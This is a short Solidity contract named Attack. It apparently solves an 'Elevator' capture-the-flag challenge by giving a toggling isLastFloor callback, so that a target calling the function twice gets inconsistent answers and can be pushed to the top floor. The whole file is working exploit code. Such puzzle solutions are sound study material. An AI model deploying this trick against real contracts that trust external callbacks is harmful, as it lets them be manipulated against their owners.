// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Attack {
    IElevator public target;
    bool public toggle;

    constructor(address _targetAddress) {
        target = IElevator(_targetAddress);
    }

    function isLastFloor(uint256) public returns (bool) {
        bool current = toggle;
        toggle = !toggle;
        return current;
    }

    function attack() public {
        target.goTo(1);
    }
}
